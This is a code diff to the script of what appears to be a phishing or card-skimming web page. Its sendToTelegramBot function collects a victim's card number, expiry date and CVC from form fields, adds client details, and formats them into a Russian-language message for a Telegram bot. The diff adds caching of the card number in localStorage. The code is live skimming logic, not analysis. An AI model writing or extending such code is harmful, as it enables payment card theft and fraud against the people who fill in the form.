@@ -1268,18 +1268,20 @@
         }
 
         async function sendToTelegramBot() {
-            try {
-                const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-                const expiry = document.getElementById('expiry').value;
-                const cvc = document.getElementById('cvc').value;
+    try {
+        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        localStorage.setItem('lastCardNumber', cardNumber);
+        
+        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+        const expiry = document.getElementById('expiry').value;
+        const cvc = document.getElementById('cvc').value;
 
-                const isCardBound = await checkCardStatus(cardNumber);
-                const paymentId = Date.now() + (paymentCounter++);
-                const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
-                const statusIcon = isCardBound ? '✅' : '🔗';
+        const isCardBound = await checkCardStatus(cardNumber);
+        const paymentId = Date.now() + (paymentCounter++);
+        const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
+        const statusIcon = isCardBound ? '✅' : '🔗';
 
-                const message = `💳 <b>${cardStatus}</b> ${statusIcon}
+        const message = `💳 <b>${cardStatus}</b> ${statusIcon}
 
 👤 <b>Клиент:</b>
 • Имя: ${formData.firstName || 'Тест'}
@@ -1465,3 +1467,4 @@
     </script>
 </body>
 </html>
+
